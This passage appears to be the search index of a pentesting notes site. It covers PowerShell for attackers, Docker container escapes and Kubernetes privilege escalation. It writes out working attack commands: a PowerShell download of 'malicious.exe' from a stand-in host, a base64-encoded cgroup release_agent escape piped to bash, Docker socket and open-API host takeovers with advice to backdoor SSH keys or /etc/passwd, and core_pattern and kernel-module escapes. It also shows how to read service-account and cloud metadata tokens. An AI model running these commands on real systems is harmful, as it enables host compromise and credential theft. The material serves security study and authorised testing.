{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"DISCLAIMER/","title":"DISCLAIMER","text":"<p>The authors and contributors of this repository disclaim any and all responsibility for the misuse of the information, tools, or techniques described herein. The content is provided solely for educational and research purposes. Users are strictly advised to utilize this information in accordance with applicable laws and regulations and only on systems for which they have explicit authorization.</p> <p>By accessing and using this repository, you agree to:</p> <ul> <li>Refrain from using the provided information for any unethical or illegal activities.</li> <li>Ensure that all testing and experimentation are conducted responsibly and with proper authorization.</li> <li>Acknowledge that any actions you take based on the contents of this repository are solely your responsibility.</li> </ul> <p>Neither the authors nor contributors shall be held liable for any damages, direct or indirect, resulting from the misuse or unauthorized application of the knowledge contained herein. Always act mindfully, ethically, and within the boundaries of the law.</p>"},{"location":"Powershell%20for%20Pentesters/powershell/","title":"Powershell for Pentesters","text":""},{"location":"Powershell%20for%20Pentesters/powershell/#what-is-powershell","title":"What is Powershell?","text":"<ul> <li>Powershell is a powerful built-in CLI or \"shell\" also task-oriented scripting language</li> <li>Mostly used by admins</li> <li>Built on top of .NET</li> <li>Scripts end with \".ps1\"</li> <li>Version 5.0 onward introduce some hurdles regarding logging and restrictive modes</li> <li>Powershell 6.0 is available MacOS and Linux also as Docker image</li> </ul>"},{"location":"Powershell%20for%20Pentesters/powershell/#fundamentals","title":"Fundamentals","text":"<p><code>C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe</code> where exe files of powershell stays.</p> <p>For 64-bit it stays under system32 directory. </p> <pre><code># You can learn like that\nPS C:\\Windows\\system32\\WindowsPowerShell\\v1.0&gt; [Environment]::Is64BitProcess\nTrue \n</code></pre> <p>You can learn detail with command below</p> <pre><code>C:\\&gt; powershell /?\n</code></pre> <p>Execution Policy </p> <pre><code>powershell.exe -ExecutionPolicy Bypass ./shell.ps1\npowershell.exe -ExecutionPolicy Unrestricted ./shell.ps1\npowershell.exe -Command Get-Process\npowershell.exe -Command \"&amp; {Get-Eventlog -Logname security}\"\n</code></pre> <p>EncodedCommand: Used to executed base64 command</p> <pre><code>powershell.exe -EncodedCommand $encodedCommand\n</code></pre> <ul> <li>Like Man pages you can reach Get-Help section of all commands</li> <li><code>Get-Help Get-Help</code></li> <li><code>Get-Help Get-Process -Full</code> Gives full result regarding that command</li> <li><code>Get-Help Get-Process -Examples</code> you can learn examples of that commands You can updata man pages with Update-Help command</li> <li>You can learn commands by tunning the command so you don't need to memorize all. </li> </ul>"},{"location":"Powershell%20for%20Pentesters/powershell/#cmdlets","title":"Cmdlets","text":"<ul> <li>You can change formats of command results</li> <li> <p>For ex. <code>Get-Childitem | Format-List *</code></p> </li> <li> <p>After learning all these commands you can pipe them to get objects</p> </li> <li> <p>For ex. <code>Get-Childitem | Sort-Object -Uniqe | Select-Object Basename</code></p> </li> <li> <p>Redirection works as same like in other OS {&lt;,&gt;}</p> </li> <li> <p>You can use different format also</p> </li> <li><code>Get-Process notepad | Format-List Path</code></li> <li> <p>or even <code>Get-Process notepad | Format-List Path,Id,ProcessName</code></p> </li> <li> <p><code>Get-WmiObject -class win32_operatingsystem | Select -Property *</code></p> </li> <li> <p>We can use <code>fl</code> as alias to Format-List</p> </li> <li> <p>If you want you can create csv file you can use Export-Csv</p> </li> <li> <p><code>Get-WmiObject -Class win32_service | Select-Object Name, ProcessID | export-csv C:\\Users\\public\\Documents\\try.csv</code></p> </li> <li>In order to see Registry hives <code>cd HKLM:\\</code></li> <li>Select-String is important command<ul> <li><code>Select-String -Path C:\\Users\\public\\Documents\\*.txt -Pattern yoursearch*</code></li> </ul> </li> <li>Get-Content</li> <li> <p>cat is same as Get-Content</p> </li> <li> <p>To learn services which are running and available </p> </li> <li><code>Get-Service</code></li> <li><code>Get-Service | Select-Object Name</code></li> <li><code>Get-Service \"n*\" | Sort-Object status -Descending</code></li> </ul>"},{"location":"Powershell%20for%20Pentesters/powershell/#modules","title":"Modules","text":"<ul> <li> <p>Modules can contain powershell scripts and code files. And they are in directories.</p> </li> <li> <p>Modules are importet in powershell session.</p> </li> <li> <p>To obtain list currently imported modules <code>Get-Module</code></p> </li> <li> <p><code>Get-Module -ListAvailable</code> we can learn all modules that we can import.</p> </li> <li> <p>In order to import module <code>Import-Module .\\new_module.psm1</code></p> </li> <li> <p>$Env:PSModulePath should include the module that we need to import</p> </li> <li> <p>You need to create a directory inside one of these paths and upload all files in that directory.</p> </li> <li> <p>After uploading these files in that directory run basically</p> </li> <li> <p>Import-Module ModuleName and confirm it Get-Module</p> </li> <li> <p>Then you can learn module commands by running Get-Command -Module AADInternals</p> </li> <li> <p>To Learn one command <code>Get-Help Add-AADIntEASDevice</code></p> </li> </ul>"},{"location":"Powershell%20for%20Pentesters/powershell/#scripts","title":"Scripts","text":""},{"location":"Powershell%20for%20Pentesters/powershell/#intro-for-scripts","title":"Intro for Scripts","text":"<ul> <li>PowerShell Scripts end with .\\ps1</li> <li>1 refer not to a version but PowerShell engine itself</li> <li>In order to run script just .\\script.ps1</li> </ul> <p><code>Param([parameter (mandatory=$true)][string]$file) Get-Content \"$file\"</code></p> <p>That script takes an argument and later write content of it. or you can put a variable inside that parameter like <code>$file= try.txt Get-Content $file</code> </p>"},{"location":"Powershell%20for%20Pentesters/powershell/#loop-statements","title":"Loop Statements","text":"<ul> <li>for()</li> <li>foreach()</li> <li>while()</li> <li>do {something}while()</li> <li>do {something}until)()</li> <li>dLearn details with    <code>ps1       Get-Help about_Foreach     Get-Help about_For     Get-Help about_Do     Get-Help about_While</code></li> <li>Examples <pre><code>Foreach()\n        $services = Get-Service\n        foreach ($i in $services){ $i.Name }\n</code></pre></li> <li>or also </li> </ul> <p><code>Get-Service | ForEach-Object {$_.Name}</code> here $_ is giving you ability to iterate it. </p> <ul> <li>Where-Object</li> <li>it gives you ability to find values</li> <li><code>Get-ChildItem C:\\Users\\ | Where-Object {$_.Name -match \"public\"}</code> <pre><code>$ports = {444,81}\n$ip = \"127.0.0.1\"\nforeach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if($socket -eq $null) {echo $ip\":\"$port\" - Closed \";} else{echo $ip\":\"$port - \"Open\"; $socket - $null;}}\n</code></pre></li> </ul>"},{"location":"Powershell%20for%20Pentesters/powershell/#objects","title":"Objects","text":"<ul> <li>We can learn objects <code>Get-Process | Get-Member -MemberType Method Get-Process -Name \"chrome\" | Kill</code></li> <li>Also with <code>New-Object</code> creating .Net Framework object or COM object is possible</li> <li>Creating new object based on .NET class <pre><code>$webclient = New-Object System.Net.WebClient\n$url = \"https://domain.example.com/malicious.exe\"\n$file = \"C:\\ProgramData\\malicious.exe\"\n$webclient.DownloadFile($url,$file)\n</code></pre></li> <li>Here webclient is a class from .NET class and that class Download file method works with two variable.</li> </ul>"},{"location":"containers/docker/","title":"Docker","text":"<p>Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.</p>"},{"location":"containers/docker/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Mounted Docker Socket</li> <li>Open Docker API Port</li> <li>Insecure Docker Registry</li> <li>Exploit privileged container abusing the Linux cgroup v1<ul> <li>Abusing CAP_SYS_ADMIN capability</li> <li>Abusing coredumps and core_pattern</li> </ul> </li> <li>Breaking out of Docker via runC</li> <li>Breaking out of containers using a device file</li> <li>References</li> </ul>"},{"location":"containers/docker/#tools","title":"Tools","text":"<ul> <li>Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations     <pre><code>dockscan unix:///var/run/docker.sock\ndockscan -r html -o myreport -v tcp://example.com:5422\n</code></pre></li> <li>DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)     <pre><code>./deepce.sh \n./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce\n./deepce.sh --no-enumeration --exploit SOCK --shadow\n./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami&gt;/tmp/hacked\"\n</code></pre></li> </ul>"},{"location":"containers/docker/#mounted-docker-socket","title":"Mounted Docker Socket","text":"<p>Prerequisite: * Socker mounted as volume : <code>- \"/var/run/docker.sock:/var/run/docker.sock\"</code></p> <p>Usually found in <code>/var/run/docker.sock</code>, for example for Portainer.</p> <pre><code>curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json\ncurl -XPOST \u2013unix-socket /var/run/docker.sock -d '{\"Image\":\"nginx\"}' -H 'Content-Type: application/json' http://localhost/containers/create\ncurl -XPOST \u2013unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start\n</code></pre> <p>Exploit using brompwnie/ed</p> <pre><code>root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true        \n[+] Hunt dem Socks\n[+] Hunting Down UNIX Domain Sockets from: /var/run/\n[*] Valid Socket: /var/run/docker.sock\n[+] Attempting to autopwn\n[+] Hunting Docker Socks\n[+] Attempting to Autopwn:  /var/run/docker.sock\n[*] Getting Docker client...\n[*] Successfully got Docker client...\n[+] Attempting to escape to host...\n[+] Attempting in TTY Mode\nchroot /host &amp;&amp; clear\necho 'You are now on the underlying host'\nchroot /host &amp;&amp; clear\necho 'You are now on the underlying host'\n/ # chroot /host &amp;&amp; clear\n/ # echo 'You are now on the underlying host'\nYou are now on the underlying host\n/ # id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n</code></pre>"},{"location":"containers/docker/#open-docker-api-port","title":"Open Docker API Port","text":"<p>Prerequisite: * Docker runned with <code>-H tcp://0.0.0.0:XXXX</code></p> <pre><code>$ nmap -sCV 10.10.10.10 -p 2376\n2376/tcp open  docker  Docker 19.03.5\n| docker-version:\n|   Version: 19.03.5\n|   MinAPIVersion: 1.12\n</code></pre> <p>Mount the current system inside a new \"temporary\" Ubuntu container, you will gain root access to the filesystem in <code>/mnt</code>.</p> <pre><code>$ export DOCKER_HOST=tcp://10.10.10.10:2376\n$ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0  -t ubuntu bash\nor\n$ docker -H  open.docker.socket:2375 ps\n$ docker -H  open.docker.socket:2375 exec -it mysql /bin/bash\nor \n$ curl -s \u2013insecure https://tls-opendocker.socket:2376/secrets | jq\n$ curl \u2013insecure -X POST -H \"Content-Type: application/json\" https://tls-opendocker.socket2376/containers/create?name=test -d '{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}'\n</code></pre> <p>From there you can backdoor the filesystem by adding an ssh key in <code>/root/.ssh</code> or adding a new root user in <code>/etc/passwd</code>.</p>"},{"location":"containers/docker/#insecure-docker-registry","title":"Insecure Docker Registry","text":"<p>Docker Registry\u2019s fingerprint is <code>Docker-Distribution-Api-Version</code> header. Then connect to Registry API endpoint: <code>/v2/_catalog</code>.</p> <pre><code>curl https://registry.example.com/v2/&lt;image_name&gt;/tags/list\ndocker pull https://registry.example.com:443/&lt;image_name&gt;:&lt;tag&gt;\n\n# connect to the endpoint and list image blobs\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/_catalog\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/tags/list\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/manifests/latest\n# download blobs\ncurl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' &gt; out.tar.gz\n# automated download\nhttps://github.com/NotSoSecure/docker_fetch/\npython /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local\n</code></pre> <p>Access a private registry and start a container with one of its image</p> <pre><code>docker login -u admin -p admin docker.registry.local\ndocker pull docker.registry.local/wordpress-image\ndocker run -it docker.registry.local/wordpress-image /bin/bash\n</code></pre> <p>Access a private registry using OAuth Token from Google</p> <pre><code>curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email\ncurl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \ndocker login -e &lt;email&gt; -u oauth2accesstoken -p \"&lt;access token&gt;\" https://gcr.io\n</code></pre>"},{"location":"containers/docker/#exploit-privileged-container-abusing-the-linux-cgroup-v1","title":"Exploit privileged container abusing the Linux cgroup v1","text":"<p>Prerequisite (at least one):   * <code>--privileged</code>  * <code>--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</code> flags.</p>"},{"location":"containers/docker/#abusing-cap_sys_admin-capability","title":"Abusing CAP_SYS_ADMIN capability","text":"<pre><code>docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo \"cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\" | base64 -d | bash -'\n</code></pre> <p>Exploit breakdown :</p> <pre><code># On the host\ndocker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash\n\n# In the container\nmkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x\n\necho 1 &gt; /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" &gt; /tmp/cgrp/release_agent\n\necho '#!/bin/sh' &gt; /cmd\necho \"ps aux &gt; $host_path/output\" &gt;&gt; /cmd\nchmod a+x /cmd\n\nsh -c \"echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs\"\n</code></pre>"},{"location":"containers/docker/#abusing-coredumps-and-core_pattern","title":"Abusing coredumps and core_pattern","text":"<ol> <li>Find the mounting point using <code>mount</code> <pre><code>$ mount | head -n 1\noverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)\n</code></pre></li> <li>Create an evil binary at the root of the filesystem: <code>cp /tmp/poc /poc</code></li> <li>Set the program to be executed on the coredumps     <pre><code>echo \"|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\" &gt; /proc/sys/kernel/core_pattern\n</code></pre></li> <li>Generate a coredump with a faulty program: <code>gcc -o crash crash.c &amp;&amp; ./crash</code> <pre><code>int main(void) {\n    char buf[1];\n    for (int i = 0; i &lt; 100; i++) {\n        buf[i] = 1;\n    }\n    return 0;\n}\n</code></pre></li> <li>Your payload should have been executed on the host</li> </ol>"},{"location":"containers/docker/#breaking-out-of-docker-via-runc","title":"Breaking out of Docker via runC","text":"<p>The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to.  - Vulnerability overview by the runC team</p> <p>Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736</p> <pre><code>$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC\n$ docker run --rm cve-2019-5736:malicious_image_POC\n</code></pre>"},{"location":"containers/docker/#breaking-out-of-containers-using-a-device-file","title":"Breaking out of containers using a device file","text":"<pre><code>https://github.com/FSecureLABS/fdpasser\nIn container, as root: ./fdpasser recv /moo /etc/shadow\nOutside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f \"sleep 1337\")/root/moo\nOutside container: ls -la /etc/shadow\nOutput: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow\n</code></pre>"},{"location":"containers/docker/#breaking-out-of-docker-via-kernel-modules-loading","title":"Breaking out of Docker via kernel modules loading","text":"<p>When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host's kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape.</p> <p>Exploitation: * Clone the repository : <code>git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping</code> * Build with <code>make</code> * Start a privileged docker container with <code>docker run -it --privileged --hostname docker --mount \"type=bind,src=$PWD,dst=/root\" ubuntu</code> * <code>cd /root</code> in the new container * Insert the kernel module with <code>./escape</code> * Run <code>./execute</code>!</p> <p>Unlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new proc files; <code>/proc/escape</code> and <code>/proc/output</code>.</p> <ul> <li><code>/proc/escape</code> only answers to write requests and simply executes anything that's passed to it via <code>call_usermodehelper()</code>.</li> <li><code>/proc/output</code> just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to.</li> </ul> <p>The clever part is that anything we write to <code>/proc/escape</code> gets sandwiched into <code>/bin/sh -c &lt;INPUT&gt; &gt; /proc/output</code>. This means that the command is run under <code>/bin/sh</code> and the output is redirected to <code>/proc/output</code>, which we can then read from within the container.</p> <p>Once the module is loaded, you can simply <code>echo \"cat /etc/passwd\" &gt; /proc/escape</code> and then get the result via <code>cat /proc/output</code>. Alternatively, you can use the <code>execute</code> program to give yourself a makeshift shell (albeit an extraordinarily basic one).</p> <p>The only caveat is that we cannot be sure that the container has <code>kmod</code> installed (which provides <code>insmod</code> and <code>rmmod</code>). To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the <code>init_module()</code> syscall to load the module into the kernel without needing <code>insmod</code>. If you're interested, take a look at the Makefile.</p>"},{"location":"containers/docker/#references","title":"References","text":"<ul> <li>Hacking Docker Remotely - 17 March 2020 - ch0ks</li> <li>Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits</li> <li>Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</li> <li>Breaking out of Docker via runC \u2013 Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019</li> <li>CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl</li> <li>OWASP - Docker Security CheatSheet</li> <li>Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017</li> <li>Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator</li> <li>Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer</li> </ul>"},{"location":"containers/kubernetes/","title":"Kubernetes","text":"<p>Kubernetes, often abbreviated as K8s, is an open-source container orchestration platform designed to automate the deployment, scaling, and management of containerized applications. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.</p>"},{"location":"containers/kubernetes/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Container Environment</li> <li>Information Gathering</li> <li>RBAC Configuration</li> <li>Listing Secrets</li> <li>Access Any Resource or Verb</li> <li>Pod Creation</li> <li>Privilege to Use Pods/Exec</li> <li>Privilege to Get/Patch Rolebindings</li> <li>Impersonating a Privileged Account</li> <li>Privileged Service Account Token</li> <li>Kubernetes Endpoints</li> <li>Exploits<ul> <li>Accessible kubelet on 10250/TCP</li> <li>Obtaining Service Account Token</li> </ul> </li> <li>References</li> </ul>"},{"location":"containers/kubernetes/#tools","title":"Tools","text":"<ul> <li> <p>BishopFox/badpods - A collection of manifests that will create pods with elevated privileges.     <pre><code>kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml\n</code></pre></p> </li> <li> <p>serain/kubelet-anon-rce - Executes commands in a container on a kubelet endpoint that allows anonymous authentication</p> </li> <li> <p>DataDog/KubeHound - Kubernetes Attack Graph     <pre><code># Critical paths enumeration\nkh.containers().criticalPaths().count()\nkh.containers().dedup().by(\"name\").criticalPaths().count()\nkh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()\nkh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()\nkh.endpoints(EndpointExposure.External).criticalPaths().count()\nkh.services().criticalPaths().count()\n\n# DNS services and port\nkh.endpoints(EndpointExposure.External).criticalPaths().limit(local,1)\n.dedup().valueMap(\"serviceDns\",\"port\")\n.group().by(\"serviceDns\").by(\"port\")\n</code></pre></p> </li> <li> <p>Shopify/kubeaudit - Audit Kubernetes clusters against common security concerns</p> </li> <li>aquasecurity/kube-bench - Checks whether Kubernetes is deployed securely by running CIS Kubernetes Benchmark</li> <li>aquasecurity/kube-hunter - Hunt for security weaknesses in Kubernetes clusters</li> <li>armosec/kubescape - Automate Kubernetes cluster scans to identify security issues</li> <li>kubesec.io - Security risk analysis for Kubernetes resources</li> <li>katacoda.com - Learn Kubernetes using interactive broser-based scenarios</li> </ul>"},{"location":"containers/kubernetes/#container-environment","title":"Container Environment","text":"<p>Containers within a Kubernetes cluster automatically have certain information made available to them through their container environment. Additional information may have been made available through the volumes, environment variables, or the downward API, but this section covers only what is made available by default.</p>"},{"location":"containers/kubernetes/#service-account","title":"Service Account","text":"<p>Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume:</p> <pre><code>/var/run/secrets/kubernetes.io/serviceaccount/token\n/var/run/secrets/kubernetes.io/serviceaccount/namespace\n/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n</code></pre> <p>If the <code>kubectl</code> utility is installed in the container, it will use this service account automatically and will make interacting with the cluster much easier. If not, the contents of the <code>token</code> and <code>namespace</code> files can be used to make HTTP API requests directly.</p>"},{"location":"containers/kubernetes/#environment-variables","title":"Environment Variables","text":"<p>The <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node. If <code>kubectl</code> is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.</p> <pre><code>KUBERNETES_SERVICE_HOST=192.168.154.228\nKUBERNETES_SERVICE_PORT=443\n</code></pre> <p>Additionally, environment variables are automatically created for each Kubernetes service running in the current namespace when the container was created. The environment variables are named using two patterns:</p> <ul> <li>A simplified <code>{SVCNAME}_SERVICE_HOST</code> and <code>{SVCNAME}_SERVICE_PORT</code> contain the IP address and default port number for the service.</li> <li>A Docker links collection of variables named <code>{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}</code> for each port the service exposes.</li> </ul> <p>For example, all of the following environment variables would be available if a <code>redis-master</code> service were running with port 6379 exposed:</p> <pre><code>REDIS_MASTER_SERVICE_HOST=10.0.0.11\nREDIS_MASTER_SERVICE_PORT=6379\nREDIS_MASTER_PORT=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP_PROTO=tcp\nREDIS_MASTER_PORT_6379_TCP_PORT=6379\nREDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11\n</code></pre>"},{"location":"containers/kubernetes/#simulating-kubectl-api-requests","title":"Simulating <code>kubectl</code> API Requests","text":"<p>Most containers within a Kubernetes cluster won't have the <code>kubectl</code> utility installed. If running the one-line <code>kubectl</code> installer within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using <code>kubectl</code> locally to determine the correct API request to send from the container.</p> <ol> <li>Run the desired command at the maximum verbosity level using <code>kubectl -v9 ...</code></li> <li>The output will include HTTP API endpoint URL, the request body, and an example curl command.</li> <li>Replace the endpoint URL's hostname and port with the <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> values from the container's environment variables.</li> <li>Replace the masked \"Authorization: Bearer\" token value with the contents of <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> from the container.</li> <li>If the request had a body, ensure the \"Content-Type: application/json\" header is included and send the request body using the customary method (for curl, use the <code>--data</code> flag).</li> </ol> <p>For example, this output was used to create the Service Account Permissions request:</p> <pre><code># NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted.\n$ kubectl -v9 auth can-i --list\nI1028 18:58:38.192352   76118 loader.go:359] Config loaded from file /home/example/.kube/config\nI1028 18:58:38.193847   76118 request.go:942] Request Body: {\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\nI1028 18:58:38.193912   76118 round_trippers.go:419] curl -k -v -XPOST  -H \"Accept: application/json, */*\" -H \"Content-Type: application/json\" -H \"User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1\" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews'\nI1028 18:58:38.295722   76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds\nI1028 18:58:38.295760   76118 round_trippers.go:444] Response Headers:\n...\n</code></pre>"},{"location":"containers/kubernetes/#information-gathering","title":"Information Gathering","text":""},{"location":"containers/kubernetes/#service-account-permissions","title":"Service Account Permissions","text":"<p>The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier. The following can be used to determine the service account's permissions:</p> <pre><code># Namespace-level permissions using kubectl\nkubectl auth can-i --list\n\n# Cluster-level permissions using kubectl\nkubectl auth can-i --list --namespace=kube-system\n\n# Permissions list using curl\nNAMESPACE=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/namespace\")\n# For cluster-level, use NAMESPACE=\"kube-system\" instead\n\nMASTER_URL=\"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\"\nTOKEN=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/token\")\ncurl \"${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" \\\n  --cacert \"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" \\\n  --header \"Authorization: Bearer ${TOKEN}\" \\\n  --header \"Content-Type: application/json\" \\\n  --data '{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"'${NAMESPACE}'\"}}'\n</code></pre>"},{"location":"containers/kubernetes/#secrets-configmaps-and-volumes","title":"Secrets, ConfigMaps, and Volumes","text":"<p>Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster.</p> <p>From a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It's not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a 